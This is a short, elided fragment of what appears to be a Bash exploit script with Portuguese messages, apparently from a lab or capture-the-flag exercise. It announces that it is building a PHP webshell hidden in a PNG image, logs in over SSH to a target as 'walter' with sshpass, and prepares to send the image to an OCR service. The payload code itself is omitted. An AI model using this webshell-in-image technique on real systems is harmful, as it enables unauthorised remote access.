...
echo "[+] Criando imagem shell.png com webshell PHP..."
python3 -c "
...
sshpass -p "$PASSWORD" ssh "walter@$TARGET" << 'ENDSSH'
    echo "[+] Codificando imagem e enviando para OCR..."
